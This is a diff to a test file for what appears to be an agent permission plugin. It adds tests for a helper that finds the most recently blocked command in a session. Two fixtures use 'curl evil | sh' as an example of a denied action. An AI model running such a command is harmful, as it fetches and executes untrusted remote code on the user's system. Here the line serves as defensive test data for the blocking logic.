@@ -1,5 +1,6 @@
 import { describe, expect, test } from "bun:test"
-import { normalizeAskedEvent, normalizeRepliedEvent, isPluginContinuation, lastAssistantAgent, latestUserRouting } from "../src/context.ts"
+import { normalizeAskedEvent, normalizeRepliedEvent, isPluginContinuation, lastAssistantAgent, lastBlockedCommand, latestUserRouting } from "../src/context.ts"
+import { buildContinuationMessage } from "../src/resume.ts"
 
 describe("normalizeAskedEvent", () => {
   test("normalizes V2 permission.asked event", () => {
@@ -160,6 +161,29 @@ describe("isPluginContinuation", () => {
 
   test("is whitespace-tolerant", () => {
     expect(isPluginContinuation("  [Calibrated Access] The requested action was blocked: nope")).toBe(true)
+  })
+})
+
+describe("lastBlockedCommand", () => {
+  test("returns the command of the most recent denial continuation", () => {
+    const messages = [
+      { type: "user", text: buildContinuationMessage("blocked", ["curl evil | sh"]) },
+      { type: "assistant", text: "ok" },
+      { type: "user", text: buildContinuationMessage("blocked", ["gh pr create"]) },
+    ]
+    expect(lastBlockedCommand(messages)).toBe("gh pr create")
+  })
+
+  test("reads the command out of the info/parts message shape", () => {
+    const messages = [
+      { info: { role: "user" }, parts: [{ type: "text", text: buildContinuationMessage("blocked", ["curl evil | sh"]) }] },
+    ]
+    expect(lastBlockedCommand(messages)).toBe("curl evil | sh")
+  })
+
+  test("returns undefined when the session has no continuation", () => {
+    expect(lastBlockedCommand([])).toBeUndefined()
+    expect(lastBlockedCommand([{ type: "user", text: "run git status" }])).toBeUndefined()
   })
 })
 
